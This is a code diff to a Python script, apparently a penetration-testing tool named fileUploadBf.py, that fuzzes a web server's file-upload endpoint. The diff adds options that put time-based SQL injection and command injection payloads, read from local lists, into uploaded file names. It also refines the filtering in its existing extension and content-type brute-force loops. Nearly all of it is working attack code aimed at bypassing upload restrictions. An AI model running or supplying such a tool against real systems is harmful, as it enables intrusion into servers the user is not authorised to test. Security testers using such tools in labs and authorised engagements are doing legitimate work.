@@ -3,6 +3,8 @@ import argparse
 import base64
 import urllib.parse
 import binascii
+import time
+
 
 # example usage:
 #python3 fileUploadBf.py -ext -c=d4t0jgvfjhdnn5aqt4tonnpq2j --url=http://10.0.2.2/upload.php
@@ -32,6 +34,8 @@ parser.add_argument("-fl", "--filterContlength", help="increase output verbosity
 parser.add_argument("-mb", "--mbytes", help="use magic bytes payload (JPEG)", action="store_true")
 parser.add_argument("-fct", "--fuzzCont", help="brute force the allowed content type of file upload", action="store_true")
 parser.add_argument("-ext", "--fileextension", help="brute force the allowed extension type of file upload", action="store_true")
+parser.add_argument("-sqli", "--sqlinjection", help="use certain payloads of SQLI on filename", action="store_true")
+parser.add_argument("-cmd", "--cmdnjection", help="use certain payloads of Command Injection on filename", action="store_true")
 #parser.add_argument("-c", "--cookies", help="cookies for authentication",nargs='?', const=1, type=str, required=True)
 parser.add_argument("-c", "--cookies", help="cookies for authentication",nargs='?', const=1, type=str)
 parser.add_argument("-u", "--url", help="specify the url and where is the file upload",nargs='?', const=1, type=str)
@@ -69,6 +73,59 @@ url = args.url
 
 
 
+if args.cmdnjection:
+    print("Using command injection time base")
+    with open('files/commandInjection.txt','r') as handle:
+        data1 = handle.readlines()
+    cmdicontent = []
+    for contlistsqli in data1:
+        cmdicontent.append(contlistsqli.replace("\n",""))
+
+    for cmdipayloads in cmdicontent:
+        start = time.time()
+        files = {'file': (f'{cmdipayloads}.jpeg', open('files/payloads/index.jpeg','rb'), 'image/jpeg')}
+
+        #values = {args.data}
+        
+        response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
+        #response = requests.post(url, files=files, data=values, cookies=cookies)
+       
+
+        print(f"Response Time: {time.ctime()}")
+        print(f"using: {cmdipayloads}")
+        print(f"response code: {response}")
+
+        print(f"content length: {len(response.content)} ")
+        print("----------------------------------------------")
+
+
+
+if args.sqlinjection:
+    print("Using SQLI Time base payloads on Filename")
+    with open('files/timebase-sqsli.txt','r') as handle:
+        data1 = handle.readlines()
+    sqlicontent = []
+    for contlistsqli in data1:
+        sqlicontent.append(contlistsqli.replace("\n",""))
+
+    for sqlipayloads in sqlicontent:
+        start = time.time()
+        files = {'file': (f'{sqlipayloads}.jpeg', open('files/payloads/index.jpeg','rb'), 'image/jpeg')}
+
+        #values = {args.data}
+        
+        response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
+        #response = requests.post(url, files=files, data=values, cookies=cookies)
+       
+
+        print(f"Response Time: {time.ctime()}")
+        print(f"using: {sqlipayloads}")
+        print(f"response code: {response}")
+
+        print(f"content length: {len(response.content)} ")
+        print("----------------------------------------------")
+
+
 if args.fileextension:
     x = 0
     print("Bypassing extensions")
@@ -95,9 +152,13 @@ if args.fileextension:
             #filter cintent length
             if args.filterContlength is not None:
 
-                if len(response.content) == args.filterContlength:
+                if str(len(response.content)) == args.filterContlength:
+                    #print(response.headers)
                     print(x)
-                elif len(response.content) is not args.filterContlength:
+                    #time.sleep(0.5)
+                else:
+                    #time.sleep(0.5)
+                    print(response.status_code)
                     print(f"using: {xtensions}")
                     print(f"response code: {response}")
                     print(f"content length: {len(response.content)} ")
@@ -126,14 +187,15 @@ if args.fileextension:
        
             response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
             #response = requests.post(url, files=files, data=values, cookies=cookies)
-            if args.filterContlength is not None and args.filterContlength == args.filterContlength:
-                print(x)
-            else:
-                print(f"using: {xtensions}")
-                print(f"response code: {response}")
+            if args.filterContlength is not None:
+                if str(len(response.content)) == args.filterContlength:
+                    print(x)
+                else:
+                    print(f"using: {xtensions}")
+                    print(f"response code: {response}")
 
-                print(f"content length: {len(response.content)} ")
-                print("----------------------------------------------")
+                    print(f"content length: {len(response.content)} ")
+                    print("----------------------------------------------")
 
             x += 1
     elif inp == "3":
@@ -152,12 +214,15 @@ if args.fileextension:
        
             response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
             #response = requests.post(url, files=files, data=values, cookies=cookies)
+            if args.filterContlength is not None:
+                if str(len(response.content)) == args.filterContlength:
+                    print(x)
+                else:
+                    print(f"using: {xtensions}")
+                    print(f"response code: {response}")
 
-            print(f"using: {xtensions}")
-            print(f"response code: {response}")
-
-            print(f"content length: {len(response.content)} ")
-            print("----------------------------------------------")
+                    print(f"content length: {len(response.content)} ")
+                    print("----------------------------------------------")
 
             x += 1
     elif inp == "4":
@@ -177,11 +242,15 @@ if args.fileextension:
             response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
             #response = requests.post(url, files=files, data=values, cookies=cookies)
 
-            print(f"using: {xtensions}")
-            print(f"response code: {response}")
+            if args.filterContlength is not None:
+                if str(len(response.content)) == args.filterContlength:
+                    print(x)
+                else:
+                    print(f"using: {xtensions}")
+                    print(f"response code: {response}")
 
-            print(f"content length: {len(response.content)} ")
-            print("----------------------------------------------")
+                    print(f"content length: {len(response.content)} ")
+                    print("----------------------------------------------")
 
             x += 1
     else:
@@ -202,12 +271,18 @@ if args.fuzzCont:
         #response = requests.post(url, files=files, proxies = proxies, data=values, cookies=cookies) # for proxy debuggin
         response = requests.post(url, files=files, data=values, cookies=cookies)
 
-        print(f"using: {contypes}")
-        print(f"response code: {response}")
 
-        print(f"content length: {len(response.content)} ")
-        print("----------------------------------------------")
+        if args.filterContlength is not None:
+            if str(len(response.content)) == args.filterContlength:
+                print(x)
+            else:
+                print(f"using: {contypes}")
+                print(f"response code: {response}")
 
+                print(f"content length: {len(response.content)} ")
+                print("----------------------------------------------")
+
+        
         x += 1
 
  
